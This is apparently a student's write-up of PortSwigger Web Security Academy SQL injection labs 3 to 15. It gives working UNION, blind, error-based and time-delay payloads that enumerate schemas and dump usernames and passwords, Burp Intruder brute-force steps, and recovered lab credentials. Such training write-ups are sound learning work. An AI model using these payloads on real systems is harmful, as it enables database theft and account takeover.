## Labs Covered

This write-up focuses on the following **PRACTITIONER-level labs** from the PortSwigger Web Security Academy related to **SQL Injection**:

**3 SQL injection attack, querying the database type and version on Oracle** 
<blockquote>
This lab demonstrates how to perform SQL injection to identify the database type and version specifically on Oracle databases.
</blockquote>

**4 SQL injection attack, querying the database type and version on MySQL and Microsoft**  
<blockquote>
This lab covers SQL injection techniques to determine the database type and version on MySQL and Microsoft SQL Server databases.
</blockquote>

**5 SQL injection attack, listing the database contents on non-Oracle databases**  
<blockquote>
This lab shows how to enumerate database contents via SQL injection on non-Oracle database systems.
</blockquote>


**6 SQL injection attack, listing the database contents on Oracle**  
<blockquote>
This lab demonstrates techniques for listing database contents through SQL injection specifically on Oracle databases.
</blockquote>

**7 SQL injection UNION attack, determining the number of columns returned by the query**  
<blockquote>
This lab explains how to use UNION-based SQL injection to find out how many columns the original query returns.
</blockquote>

**8 SQL injection UNION attack, finding a column containing text**  
<blockquote>
This lab focuses on identifying which column(s) in the UNION query can contain text data for effective data retrieval.
</blockquote>

**9 SQL injection UNION attack, retrieving data from other tables**  
<blockquote>
This lab shows how to exploit UNION SQL injection to extract data from other tables in the database.
</blockquote>

**10 SQL injection UNION attack, retrieving multiple values in a single column**  
<blockquote>
This lab demonstrates how to retrieve multiple values within a single column using UNION SQL injection techniques.
</blockquote>


**11 Blind SQL injection with conditional responses**  
<blockquote>
This lab explores blind SQL injection by observing conditional differences in server responses to infer data.
</blockquote>

**12 Blind SQL injection with conditional errors**  
<blockquote>
This lab shows how to use error messages conditionally triggered by injection payloads to extract information.
</blockquote>


**13 Visible error-based SQL injection**  
<blockquote>
This lab demonstrates SQL injection techniques that cause visible database errors revealing sensitive information.
</blockquote>

**14 Blind SQL injection with time delays**  
<blockquote>
This lab explains how time-based blind SQL injection works by observing delays in server responses.
</blockquote>


**15 Blind SQL injection with time delays and information retrieval**  
<blockquote>
This lab covers advanced time-based blind SQL injection to retrieve detailed database information.
</blockquote>


**16 Blind SQL injection with out-of-band interaction**  
<blockquote>
This lab shows how attackers can use out-of-band channels to extract data in blind SQL injection scenarios.
</blockquote>

**17 Blind SQL injection with out-of-band data exfiltration**  
<blockquote>
This lab focuses on exploiting blind SQL injection to exfiltrate data via out-of-band techniques.
</blockquote>


**18 SQL injection with filter bypass via XML encoding**  
<blockquote>
This lab demonstrates bypassing input filters in SQL injection by encoding payloads using XML.
</blockquote>

---

### LAB 3 - SQL injection attack, querying the database type and version on Oracle

### Lab Description

![image](https://github.com/user-attachments/assets/a714971e-8a3d-490b-bafa-95a0bbdf26b7)

### Solution

Here we can find out the number of columns that the web app is querying & also determine the columns which have text data but to retreive a column data  we need to know the table name.

> In oracle there is a default table called **DUAL**. Using that we can retreive column data.


For example: UNION SELECT 'abc' FROM dual
We see there are 2 values displayed in the table, the description and the content of the post:

![image](https://github.com/user-attachments/assets/02bc6919-b024-44fe-a576-d03a9fe45771)

### Determine the number of columns 

```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>' ORDER BY 3 --
```

**ORDER BY 3** gives error, so there are 2 columns being retreived.

### Determine the column which has text data


```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>' UNION SELECT 'hanzala','cys' FROM dual --
```
Both the columns show the text in response. So both columns support text data.

### Retreive db type & version of ORACLE 

To retretive db type & version of ORACLE , we have the syntax `SELECT * FROM v$version`

```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>' UNION SELECT NULL,banner FROM v$version --

```
To display the version we need to execute one of these:
```sql
SELECT banner FROM v$version
SELECT version FROM v$instance

/filter?category=Gifts'+union+all+select+'1',banner+FROM+v$version-- 

```
We got the db info we needed.

![image](https://github.com/user-attachments/assets/dc4d79b0-27da-4b23-bd0b-532493254ca2)

Response

![image](https://github.com/user-attachments/assets/8d9c0540-ae33-4800-8ed5-c2548ccebcd6)



With v$instance the server returns an error message.

![image](https://github.com/user-attachments/assets/fdd34372-64f7-4fe7-9d9d-a189abd2c423)


---


### LAB 4 - SQL injection attack, querying the database type and version on MySQL and Microsoft

### Lab Description

![image](https://github.com/user-attachments/assets/ae883073-e0e3-41c5-91c2-affcad1b5413)

### Solution

1. **Verify the Parameter**
   - Confirm that the parameter is vulnerable to injection,In our case we get ' error ,So it is the correct parameter

   ![image](https://github.com/user-attachments/assets/65e3d629-10b2-4a9d-b6e9-2b5e3f851452)

2. **Determine the Number of Columns**

    ![image](https://github.com/user-attachments/assets/64c3de1b-5283-4433-bdb9-273562acafaa)

   - Use `Ctrl + U` to URL encode the input.

     ![image](https://github.com/user-attachments/assets/34f21a1d-75f1-42d2-b4c7-cd18d93acbd9)

   - Test repeatedly to identify the correct number of columns.
  
     ![image](https://github.com/user-attachments/assets/e39ed3bc-7112-4cf5-a4bf-68cb0a61bb67)

   I got 500 Internal Server Error,On third columns additon ,So we have 2 columns

   ![image](https://github.com/user-attachments/assets/770f2f26-bc7d-48ff-96fe-bd528d34793d)

4. **Identify Columns Containing Text**
   - Discovered that both parameters accept string inputs.
   
   ![image](https://github.com/user-attachments/assets/074d01a7-68ec-447f-86c5-ea66bb94743f)

   ![image](https://github.com/user-attachments/assets/a0077cbe-9897-41cb-87a2-9bdab6bdc89b)

5. **Retrieve the Database Version**
   - Output the version of the database.Looking at Portswigger cheatsheet

![image](https://github.com/user-attachments/assets/c3a3289b-0477-499c-9801-f0b293aaf3c6)

![image](https://github.com/user-attachments/assets/4060e65d-0dca-49b0-ade0-7c490095b514)

And Lab is Solved

  ![image](https://github.com/user-attachments/assets/548fce85-e9c9-4c44-a479-ad2232aeba37)

---

### LAB 5 - SQL injection attack, listing the database contents on non-Oracle databases

### Lab Description

![image](https://github.com/user-attachments/assets/1a00d79d-4ddc-4f29-be22-4a910bdafbf3)



### Solution

Most database management systems (e.g., MySQL, PostgreSQL, SQL Server, but **not Oracle**) provide an `information_schema` database containing metadata about the database structure. The `information_schema.tables` view can be queried to list all tables in the database.

### List the database contents

### List tables -

From the information schema tables, there are some default columns.

![image](https://github.com/user-attachments/assets/b09dae92-7c9e-4a0a-a89e-4a95e735f33b)



1. **Verify the Vulnerable Parameter**
   - The `/filter?category=` endpoint is vulnerable to SQL injection.
     
   - Valid payloads to display data:
     - `/filter?category=Gifts'--`: Displays 4 posts in the "Gifts" category.

        ![image](https://github.com/user-attachments/assets/4d611f14-2866-465b-a268-93f396cfc9c3)

     - `/filter?category=Gifts'+or+1=1--`: Displays all items by bypassing the filter.

2. **Determine the Number of Columns**
 

**ORDER BY 3**

```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>' ORDER BY 3--
```

![image](https://github.com/user-attachments/assets/7802f6b1-3566-4a45-979a-fcdfffcd92f7)


### Determine wich column contains text data

```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>' SELECT 'abc','def'--
```
Both the columns contain text data.

![image](https://github.com/user-attachments/assets/90208163-fc2b-4161-8b1b-0f4c750b57f9)

 Response

![image](https://github.com/user-attachments/assets/054c619a-4eda-4407-ad5c-00eecac98146)

3. **List Table Names**
   - Query the `information_schema.tables` to retrieve table names:
     - Payload: `/filter?category=Gifts'+union+all+select+'1',TABLE_NAME+from+information_schema.tables--`
     - This returns a list of table names in the database.
    
       ![image](https://github.com/user-attachments/assets/76e3aeb0-02df-4fb6-9d80-7866e7ff9166)

      ![image](https://github.com/user-attachments/assets/e7f9898f-8d13-4a21-a9cc-ab67cf58dcab)

4. **List Columns in the `users_vptjgu` Table**
   - Query the `information_schema.columns` to retrieve column names for the `users_vptjgu` table:
     - SQL Query: `SELECT * FROM information_schema.columns WHERE table_name = 'users_vptjgu'`
     - Payload: `/filter?category=Gifts'+union+all+select+'1',COLUMN_NAME+from+information_schema.columns+WHERE+table_name+=+'users_vptjgu'--`
     - Result: Two columns identified:
       - `username_lvfons`
       - `password_femvin`
      
         ![image](https://github.com/user-attachments/assets/3fccadc8-537e-4f3e-bf84-3052c0fcb2bc)


5. **Retreive information from the columns username_lvfons anmd password_femvin from the `users_vptjgu` Table**
   - Retrieve the contents of the `username_lvfons` and `password_femvin` columns:
     - SQL Query: `SELECT username_lvfons, password_femvin FROM users_vptjgu`
     - Payload: `/filter?category=Gifts'+union+all+select+username_lvfons,password_femvin+from+users_vptjgu--`
     - This payload dumps the usernames and passwords from the `users_vptjgu` table.

   Now we get the username and password of all users.

 ![image](https://github.com/user-attachments/assets/f7682d5a-779b-45f1-9b57-a4f8ffbb595d)

   Now login as administrator,

   ![image](https://github.com/user-attachments/assets/a0dffe6b-76b9-45a2-bf5b-4f4d5504d99e)



---

### LAB 6 - SQL injection attack, listing the database contents on Oracle

### Lab Description
![image](https://github.com/user-attachments/assets/fa6151fa-d244-4ae9-abd8-ef26c1c04e44)

### Solution


## Initial Observations
- The table displays 2 values:
  1. The description
  2. The content of the post

![image](https://github.com/user-attachments/assets/d071bf01-3e1d-45e1-b838-6d689b5b92be)

### Basic Payloads
These payloads are valid for displaying:
- The 4 posts in Gifts
- All items in the second query

```
/filter?category=Pets'--
/filter?category=Pets'+or+1=1--
```


### Determine number of columns -

Order by 3 throws a error which means there are 2 columns.

```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>' ORDER BY 3 --
```

![image](https://github.com/user-attachments/assets/5684093a-49cb-4272-9ae9-669a7470b4ac)



### Determine column with text data

Here we use the `DUAL` table which is by defaut present in ORACLE databse

Both columns have text data

```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>' UNION SELECT 'abc','def' FROM DUAL--
```
![image](https://github.com/user-attachments/assets/9ca47b44-5980-46b1-84e7-eed80ecc8590)


### Enumerating Tables
List all table names:

```sql
SELECT table_name from all_tables
```

Payload:
```
/filter?category=Pets'+union+all+select+'1',table_name+from+all_tables--
```
![image](https://github.com/user-attachments/assets/929733ea-2df0-4fc6-87e0-c42ee3b99e0b)

**Interesting table found:** `USERS_XWRQEE`





### Enumerating Columns
List columns in the target table:
Payload:
```
/filter?category=Pets'+union+all+select+'1',COLUMN_NAME+from+all_tab_columns+WHERE+table_name='USERS_XWRQEE'--
```


![image](https://github.com/user-attachments/assets/e7396197-50a8-4ccb-b963-1d53ee9005a7)


### Retreive all credential

Final query to extract credentials:


Payload:
```
/filter?category=Pets'+union+all+select+USERNAME_KIWRQE,PASSWORD_OCABHB+from+USERS_XWRQEE--
```
![image](https://github.com/user-attachments/assets/02a924da-6947-4711-a5a7-2a13fa5cfc01)

administrator - `eyjpiterylmsfcqq25ja`
wiener        - `tl4drtumhh8bgq4ndq4f`
carlos        - `z8ir2ghepg2rjjqgq3av`

Now login as administrator

![image](https://github.com/user-attachments/assets/8c13605f-963e-4928-9ce9-54b5e38556f4)

---

### LAB 7 - SQL injection UNION attack, determining the number of columns returned by the query

### Lab Description

![image](https://github.com/user-attachments/assets/ae03b5a9-f8ad-48b2-9b52-06c1bbb020aa)

### Solution

## Initial Observations
- The table displays 2 values:
  1. The name
  2. The price of the product
---

We craft the request by adding **UNION** along with **ORDER BY** clause to *find the number of columns that is being used by the query*.

**ORDER BY 1**

```SQL
SELECT * FROM someTable WHERE category = '<CATEGORY>' ORDER BY 1 --
```

![image](https://github.com/user-attachments/assets/02fafc7c-ab08-48cc-ae65-316157a2b3dd)


**ORDER BY 2**

![image](https://github.com/user-attachments/assets/9d5a1e19-31fd-4823-a449-3c83cb1adc77)


**ORDER BY 3**

![image](https://github.com/user-attachments/assets/e14e88f2-dbe8-48f9-a2c9-256ec11df49e)


**ORDER BY 4**

![image](https://github.com/user-attachments/assets/f62550ea-af17-45be-a00c-0aa8fbb9f657)


This throws an error. It means that there are 3 columns that is being retreived in the query by the web application.

Now as per our given question, we use **UNION SELECT NULL** payload to return an additional column that contains null values.

```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>' UNION SELECT NULL,NULL,NULL --
```

or

We can also add values instead of using NULL:

```sql
/filter?category=Accessories'+union+all+select+'0','1','2'--

```

![image](https://github.com/user-attachments/assets/5f2fb7a4-56b5-49ad-af4d-26c2df05dff1)

![image](https://github.com/user-attachments/assets/c330ef4c-a56c-430b-a7b9-eb033bf67e11)

---

### LAB 8 - SQL injection UNION attack, finding a column containing text

### Lab Description

![image](https://github.com/user-attachments/assets/4ef0709e-e36a-44a4-aeb9-4954507f7e4b)

### Solution

Here's the properly formatted markdown (`.md`) version of your SQL injection testing notes:


## Initial Observations
- The table displays 2 visible values:
  1. Product name
  2. Product price

![image](https://github.com/user-attachments/assets/f385f026-f806-42cc-88be-23e27a9c30e4)

## Basic Injection Payloads
These payloads successfully display:
- The 4 items in Accessories category
- All items in the database

```
/filter?category=Accessories'--
/filter?category=Accessories'+or+1=1--
```

## UNION Attack Setup
Determined the query returns 3 columns. Test with(we can also used ORDER BY 4 --):

```
/filter?category=Accessories'+union+all+select+NULL,NULL,NULL--
```

## String Injection Test
Successfully injected test string "Qrc0Pq" in the second column and catgory of product increase from 4 to 5:

```
/filter?category=Accessories'+union+all+select+'0','Qrc0Pq','1234'--
```
![image](https://github.com/user-attachments/assets/a5484dfe-eaab-4770-940e-62208f0d78a7)


![image](https://github.com/user-attachments/assets/c8b503cc-2d79-4aee-9766-008f59ff2f61)


---

### LAB 9 - SQL injection UNION attack, retrieving data from other tables

### Lab Description

![image](https://github.com/user-attachments/assets/7b492e4b-6fc8-40c7-89f2-10ebeef73dbc)

### Solution

#### Determine number of columns

**ORDER BY 3** shows an error , it means the web application retreives 2 columns in the query

```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>' ORDER BY 4 --
```

![image](https://github.com/user-attachments/assets/d21c977a-4b5d-4495-a4e4-d4fa361507f2)

Both column first and second return text

```sql

/filter?category=Gifts'+union+all+select+NULL,NULL--

```

![image](https://github.com/user-attachments/assets/3bbb887e-d737-4e03-8e18-e42851275984)

Since both the columns contain text data, we can retreive username and password from the users table of the database without any concatination method.


```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>' UNION ALL SELECT username,password FROM users --

```

![image](https://github.com/user-attachments/assets/3c5aa6dd-ae69-46c8-a78b-bdc19646ad91)

Thus we got all the usernames & password stored in the database.
Now we can login as administrator !

![image](https://github.com/user-attachments/assets/343a3b1c-205f-4850-b76e-0fcf491709d6)


---

### LAB 10 - SQL injection UNION attack, retrieving multiple values in a single column

### Lab Description

![image](https://github.com/user-attachments/assets/99538ee1-8eed-43ea-9945-d9eaa34b3a57)

### Solution

## String Concatenation in SQL Databases

You can concatenate multiple strings to make a single string in SQL. The syntax varies by database system:

| Database    | Command                                               | Notes                          |
|-------------|------------------------------------------------------|--------------------------------|
| **Microsoft** (SQL Server) | `'foo'+'bar'`                                  | Uses + operator               |
| **PostgreSQL** | `'foo'||'bar'`                                   | Uses || operator (no space)     |
| **MySQL**      | `'foo' 'bar'`<br>`CONCAT('foo','bar')`         | Space between strings or CONCAT function |
| **Oracle**     | `'foo'||'bar'`                                   | Uses || operator with spaces   |





Query made - 

```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>'
```

#### Determine the number of columns -

**ORDER BY 3** returns an error, which means there are 2 columns that is retreived by the web app from the db.


```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>' ORDER BY 3 --
```

![image](https://github.com/user-attachments/assets/430f6ab1-8857-4b02-852d-980bb0f6e4b3)


#### Determine which columns contain text data -

Also, that there are 2 columns returned by the query and we can do check which column return 200 when we insert text on it,So that cotains text:

```sql
/filter?category=Gifts'+union+all+select+NULL,NULL--

```

![image](https://github.com/user-attachments/assets/d65bf69d-4374-4fe5-9d5a-99ef1e28d0b6)

 2 columns only contains text

![image](https://github.com/user-attachments/assets/6a5842b3-ba38-49b3-ae0b-1ce8bfde4229)

Response

![image](https://github.com/user-attachments/assets/90de8795-b251-4abc-ab03-fc37675bdc8f)



#### Determine the type of database -

![image](https://github.com/user-attachments/assets/20f4049c-c7f5-44e8-8663-0bf9651ff7a3)


Since we know 2nd column is containing text data, we can try to use version command of each database system to identify the type of database present in the backend.

**ORACLE**

```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>' UNION SELECT NULL,banner FROM v$version --
```

![image](https://github.com/user-attachments/assets/1170d66b-9d2f-4a25-988d-c82f1c94e31f)


500 - SERVER ERROR

**Microsoft**


```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>' UNION SELECT NULL,@@version --
```

![image](https://github.com/user-attachments/assets/9c2a9c68-f2c5-4e7c-8f3f-671e07881585)

500 - Server Error

> NOTE - Syntax for findng version is the same for both Microsoft and MYSQL



**PostgreSQL**



```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>' UNION SELECT NULL,version() --
```

![image](https://github.com/user-attachments/assets/7db14f2d-d566-429d-8f38-cc612b850045)


We can confirm that this is an POSTgreSQL db in backend.

![image](https://github.com/user-attachments/assets/f8a0f802-d3a4-4ba8-94a7-d82b4b31d7f4)


#### Retreive multiple values in single column -

For POSTgreSQL , the syntax for string concatination is `'foo'||'bar'`

```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>' UNION SELECT NULL,username||'-'||password FROM users --
```
Request

![image](https://github.com/user-attachments/assets/7b87f937-4527-41a6-8410-3d8cfef6ad58)

Response:

![image](https://github.com/user-attachments/assets/f5715be4-5b1f-4ee0-a208-4a0366c21488)


We got all the usernames & passwords,

![image](https://github.com/user-attachments/assets/59d0febe-4e2a-4d3c-bf74-54d243961f61)


Now we can login as administrator

![image](https://github.com/user-attachments/assets/852adc84-77e4-4bc7-a821-a28dc8eaf1ce)





### LAB 11 - Blind SQL injection with conditional responses

### Lab Description

![image](https://github.com/user-attachments/assets/3b6f5158-ac3d-42db-8831-e09c3b854a19)


### Solution


## Vulnerability Description
A SQL injection vulnerability was identified in the application's cookie-based `TrackingId` parameter. This vulnerability allows an attacker to manipulate SQL queries and extract sensitive data, such as the administrator's password, from the database.


### Initial SQL Injection Test

Request looks like

![image](https://github.com/user-attachments/assets/c8137707-1861-43d2-9d76-fce6faa4a116)

The application displays a "Welcome back!" message when a valid SQL condition is injected into the `TrackingId` cookie parameter.

- **Payload (Successful)**:
  ```
  Cookie: TrackingId=WrJLQvH7F2RO6KVc'+AND+'1'='1;
  ```
  **Result**: "Welcome back!" message appears, indicating the SQL condition `1'='1` evaluates to true.

  ![image](https://github.com/user-attachments/assets/23b3518e-1712-4178-86a1-f6d7fb8ecf32)

- **Payload (Unsuccessful)**:
  ```
  Cookie: TrackingId=WrJLQvH7F2RO6KVc'+AND+'1'='0;
  ```
  **Result**: No "Welcome back!" message, as the SQL condition `1'='0` evaluates to false.

  ![image](https://github.com/user-attachments/assets/3b6cf31b-06c4-4222-b21b-a3d91b69bb24)


This confirms the presence of a SQL injection vulnerability in the `TrackingId` parameter.

If we send the value as  50 ie `' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>50)='a`  , we dont get any welcome message which means its not > 50  characters.

![image](https://github.com/user-attachments/assets/f6516cb4-1db1-41e5-99c4-3986f3363859)

Automate this -> 

1. Send request to Intruder
2. Add the password length part [> 1] 
3. Attack type - SNIPER
4. Payload type - Numbers
5. Give number range from 1-50

There is a difference in length at number 20, means that while checking `if length(password) > 20` it FAILS.

So the total **length of password is 20**.


### Password Extraction or Bruteforce the 20 character length password
To extract the administrator's password, the following SQL injection technique was used to test the password character by character.

#### Step 1: Testing the First Letter
To determine if the first letter of the administrator's password is 's', the following payload was used:
```
c' AND SUBSTRING((SELECT Password FROM Users WHERE Username='administrator'),1,1)='s
```
**Cookie Payload**:
```
Cookie: TrackingId=WrJLQvH7F2RO6KVc'+AND+SUBSTRING((SELECT+Password+FROM+Users+WHERE+Username='administrator'),1,1)='s
```

![image](https://github.com/user-attachments/assets/396cf2c5-44e1-4e1c-b76f-d74727008545)

**Result**: "Welcome back!" message appeared, confirming the first letter of the password is 's'.

![image](https://github.com/user-attachments/assets/f0805747-c418-4336-89a6-cc90a4df8111)




#### Optimization Attempt
An initial attempt to test multiple letters at once (e.g., checking if the first two characters are 'ss'):
```
c' AND SUBSTRING((SELECT Password FROM Users WHERE Username='administrator'),1,2)='ss
```
**Cookie Payload**:
```
Cookie: TrackingId=WrJLQvH7F2RO6KVc'+AND+SUBSTRING((SELECT+Password+FROM+Users+WHERE+Username='administrator'),1,2)='ss
```
![image](https://github.com/user-attachments/assets/9a89cca8-dca5-44da-937a-7a7b8eb94c8d)

However, testing one character at a time was determined to be more time consuming

#### Step 2: Testing Subsequent Letters of password 
To optimize the process, each character of the password was tested individually using the `SUBSTRING` function. The following payloads were sent to test each position:
```
c' AND SUBSTRING((SELECT Password FROM Users WHERE Username='administrator'),1,1)='a
c' AND SUBSTRING((SELECT Password FROM Users WHERE Username='administrator'),2,1)='a
c' AND SUBSTRING((SELECT Password FROM Users WHERE Username='administrator'),3,1)='a
c' AND SUBSTRING((SELECT Password FROM Users WHERE Username='administrator'),4,1)='a
c' AND SUBSTRING((SELECT Password FROM Users WHERE Username='administrator'),5,1)='a
...
```
This process was repeated for each character position, testing all possible letters until the correct character was identified by the presence of the "Welcome back!" message.
#### Final Result

Arrange the payload number and write the payload2 alphabets (password characters) in order .
By iterating through each character position and testing all possible letters, the administrator's password was retrieved as:
```
ssmyivfjyj5m1bvch02g
```
![image](https://github.com/user-attachments/assets/f34d627b-0d15-44f8-bea4-325c386f6773)

---

### LAB 12 - Blind SQL injection with conditional errors

### Lab Description
![image](https://github.com/user-attachments/assets/fa192b98-6d18-463d-add1-af9fe982973a)

### Solution

Request looks like

![image](https://github.com/user-attachments/assets/c8137707-1861-43d2-9d76-fce6faa4a116)


### Step 1: Identifying SQL Injection
The application processes the `TrackingId` cookie in the following query:

```sql
SELECT trackingId FROM someTable WHERE trackingId = '<COOKIE-VALUE>'
```

- **Inducing Syntax Error**:
  - Payload: `TrackingId=xyz''`
  - Modified Query: 
    ```sql
    SELECT trackingId FROM someTable WHERE trackingId = 'xyz'''
    ```
  - Result: Error due to invalid SQL syntax (unclosed quote).

  ![image](https://github.com/user-attachments/assets/13ed80f6-ce23-4c00-b630-ee606750e1a7)


- **Valid Syntax Test**:
  - Payload: `TrackingId=xyz'''`
  - Modified Query:
    ```sql
    SELECT trackingId FROM someTable WHERE trackingId = 'xyz'''
    ```
  - Result: HTTP 200 response, indicating valid SQL syntax.

  ![image](https://github.com/user-attachments/assets/3af20140-4844-498e-b4e8-f9cf57360e88)


### Step 2: Confirming Oracle Database
To confirm the database is Oracle, which requires a table in `SELECT` statements:

- **Invalid Subquery**:
  - Payload: `TrackingId=xyz'||(SELECT '')||'`
  - Result: Error, as Oracle requires a table.

![image](https://github.com/user-attachments/assets/2c4aab4a-cde4-4c82-8265-667380a4cccc)


- **Valid Subquery with DUAL**:
  - Payload: `TrackingId=xyz'||(SELECT '' FROM dual)||'`
  - Result: HTTP 200 response, confirming Oracle database.
  
  ![image](https://github.com/user-attachments/assets/05f80d30-b3f0-462c-9461-81b6537903bb)


- **Invalid Table Test**:
  - Payload: `TrackingId=xyz'||(SELECT '' FROM not-a-real-table)||'`
  - Result: Error, confirming the need for a valid table.

![image](https://github.com/user-attachments/assets/97e64a38-7b22-4fbe-9efd-63e4638b34f0)


### Step 3: Verifying Users Table
To check if a `users` table exists:

- Payload: `TrackingId=xyz'||(SELECT '' FROM users WHERE ROWNUM = 1)||'`
- Result: HTTP 200 response, confirming the `users` table exists.
- Note: `WHERE ROWNUM = 1` ensures a single row to avoid concatenation issues.
 
![image](https://github.com/user-attachments/assets/a4496ca9-b074-4529-b974-5a8de1f573fb)


### Step 4: Verifying Administrator User
To confirm the existence of an `administrator` user:

- **True Condition Test**:
  - Payload: `TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'`
  - Result: Error due to division by zero, confirming true condition triggers an error.

  ![image](https://github.com/user-attachments/assets/e3c6eb48-e12f-465f-a543-94d4cd50d797)


- **False Condition Test**:
  - Payload: `TrackingId=xyz'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'`
  - Result: HTTP 200 response, as false condition returns empty string.

![image](https://github.com/user-attachments/assets/d1d5f787-4511-496e-aa28-2ae4d5ce2d96)


- **Administrator Check**:
  - Payload: 
    ```sql
    TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
    ```
  - Result: Error, confirming the `administrator` user exists.

![image](https://github.com/user-attachments/assets/be46c74f-ffb0-40c2-982c-f93a808e9f97)


### Step 5: Determining Password Length
To find the length of the administrator's password:

- Payload: 
  ```sql
  TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>N THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
  ```
- Method: Used Burp Intruder to test `N` from 1 to 21.
- Result: Error for `LENGTH > 20`, but not for `LENGTH > 21`, indicating the password is **20 characters**.

![image](https://github.com/user-attachments/assets/a4954f39-14fc-4629-a8d4-48a6f5da7415)



### Step 6: Brute-Forcing the Password
To extract the password character by character:

- Payload: 
  ```sql
  TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,§N§,1)='§CHAR§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
  ```
- Method: Used Burp Intruder with **Cluster Bomb** attack:
  - Payload 1: Position (`N` from 1 to 20).
  - Payload 2: Alphanumeric character set.
- Result: Errors for specific characters at each position, revealing the password: **`8fysuozl95mngaem0abi`**.

![image](https://github.com/user-attachments/assets/5e85ee25-29ba-4a9c-bb10-b34378ad07ca)





### Step 7: Login as Administrator
- Using the password `8fysuozl95mngaem0abi`, successful login as the `administrator` user was achieved.
![image](https://github.com/user-attachments/assets/8beec78f-ac86-4bb4-b448-357a0a60ad67)


---

### LAB 13 - Visible error-based SQL injection

### Lab Description

![image](https://github.com/user-attachments/assets/c1acb5bc-75ae-4b65-bfd0-34f58f0d9a28)

### Solution

## Overview

Database misconfigurations can lead to detailed error messages that expose sensitive information to attackers. For example, injecting a single quote into an `id` parameter may result in:

```sql
Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = '''. Expected char
```

By triggering errors that reveal query results, attackers can transform a blind SQL injection into a "visible" one. A key technique involves the `CAST()` function, which converts data types. For example:

**Request Payload**:
```sql
CAST((SELECT example_column FROM example_table) AS int)
```

If the data is a string, casting it to an incompatible type like `int` can generate:

**Response**:
```sql
ERROR: invalid input syntax for type integer: "Example data"
```

> **Note**: This approach is particularly useful when character limits prevent conditional responses, allowing data extraction through error messages.

### Step 1: Identifying SQL Injection
When selecting a product category, the application sends a GET request with a `TrackingId` and session cookie.

![image](https://github.com/user-attachments/assets/00b86d7e-5b22-4acd-8941-65c44deba520)


Testing for SQL injection by injecting a single quote:

- **Payload**:
  ```sql
  Cookie: TrackingId=e00R0OKbtGq3H944';
  ```

- **Response**: Error revealing the backend query:
  ```sql
  SELECT * FROM tracking WHERE id = 'e00R0OKbtGq3H944''
  ```
![image](https://github.com/user-attachments/assets/efa7183b-c218-4e68-a85b-9c08e9902a2e)


### Step 2: Crafting CAST-Based Payload
Using `CAST` to induce errors:

- **Payload**:
  ```sql
  TrackingId=hxcQNYCw0qIfVGRe' AND CAST((SELECT 1) AS int)--
  ```

- **Response**: 500 Internal Server Error, indicating the `AND` condition requires a boolean expression.

![image](https://github.com/user-attachments/assets/b80ba310-6377-48a5-90d2-fdb3fcf32921)


- **Modified Payload** (adding boolean comparison):
  ```sql
  TrackingId=hxcQNYCw0qIfVGRe' AND 1=CAST((SELECT 1) AS int)--
  ```

- **Response**: HTTP 200 OK, returning category items, confirming the condition is true.

![image](https://github.com/user-attachments/assets/54c81f43-7e76-494c-a204-e8be7a1ce3b6)

### Step 3: Extracting Username
To retrieve the username from the `users` table:

- **Payload**:
  ```sql
  TrackingId=' AND 1=CAST((SELECT username FROM users) AS int)--
  ```

- **Response**: 500 Internal Server Error due to query truncation.

![image](https://github.com/user-attachments/assets/8aac2700-95b7-4e3c-9baa-bb4c4dd9d3cc)


- **Optimized Payload** (removing `TrackingId` value and adding `LIMIT 1`):
  ```sql
  TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
  ```

- **Response**: Error revealing the username: `administrator`.

![image](https://github.com/user-attachments/assets/10f30c12-1dd6-4cde-b1f7-d8623c955b6b)

### Step 4: Extracting Password
To retrieve the administrator’s password:

- **Payload**:
  ```sql
  TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
  ```

- **Response**: Error revealing the password: `92xxhtubhmgxhsyhhldk`.

![image](https://github.com/user-attachments/assets/61c938e7-a0f3-4329-84e1-04eb196c4552)

- **Note**: `LIMIT 1` ensures only the first row (administrator’s data) is returned, bypassing the need for `WHERE username='administrator'`.

### Step 5: Administrator Login
- **Credentials**: `administrator:92xxhtubhmgxhsyhhldk`
- **Result**: Successful login to the shopping website.

![image](https://github.com/user-attachments/assets/42b34b7b-3a4d-47eb-9903-37828436d5ba)


---

### LAB 14 - Blind SQL injection with time delays

### Lab Description

![image](https://github.com/user-attachments/assets/ccb60dcf-973b-4a01-b481-b4dacd804a31)

### Solution

SLEEP command differs for each type of databse, here we find it by trial & error method that it is a POSTgreSQL database

![image](https://github.com/user-attachments/assets/1e58ea3d-294c-474f-be18-49a611d02819)


To do this we can use the following payload 

```sql
TrackingId=x'||pg_sleep(10)--
```

![image](https://github.com/user-attachments/assets/49ef139c-addf-4cef-9922-fd71335b0d6b)

Response

![image](https://github.com/user-attachments/assets/537a4b54-5e26-4e52-b1a7-d87cc7f553e8)

We get a response after 10 sec which confirms the SQL injection vulnerability.

![image](https://github.com/user-attachments/assets/5076d3bf-e1dc-419d-b2c9-683abe066144)

---

### LAB 15 - Blind SQL injection with time delays and information retrieval

### Lab Description

![image](https://github.com/user-attachments/assets/690455ba-3ce7-4cf1-b5fd-542b1f6c7300)

### Solution

